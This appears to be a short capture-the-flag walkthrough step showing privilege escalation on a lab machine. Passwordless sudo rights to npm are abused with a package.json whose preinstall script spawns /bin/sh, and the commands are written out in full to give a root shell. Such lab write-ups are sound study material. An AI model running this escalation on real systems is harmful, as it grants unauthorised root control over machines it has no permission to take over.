```bash
dylan@jason:~$ sudo -l
Matching Defaults entries for dylan on jason:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
```

Visit : `https://gtfobins.github.io/` and then search for `npm`

```bash
dylan@jason:~$ TF=$(mktemp -d)
dylan@jason:~$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
dylan@jason:~$ sudo npm -C $TF --unsafe-perm i
```

Finally, got the shell as `root` user.
